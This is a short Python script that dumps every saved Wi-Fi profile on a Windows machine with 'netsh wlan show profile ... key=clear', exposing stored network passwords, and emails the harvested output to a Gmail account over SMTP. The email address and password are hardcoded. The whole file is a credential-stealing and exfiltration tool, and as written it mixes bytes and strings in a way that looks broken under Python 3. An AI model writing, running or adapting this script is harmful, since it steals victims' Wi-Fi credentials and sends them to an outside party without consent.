#!/usr/bin/env python3
import subprocess, smtplib, re


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# UPC723762 represents the network name value and i have to customize it to my own.
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
list_of_network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in list_of_network_names:
    command = "netsh wlan show profile: " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result
send_email("officialsimonparris@gmail.com", "evilpuppy", result)
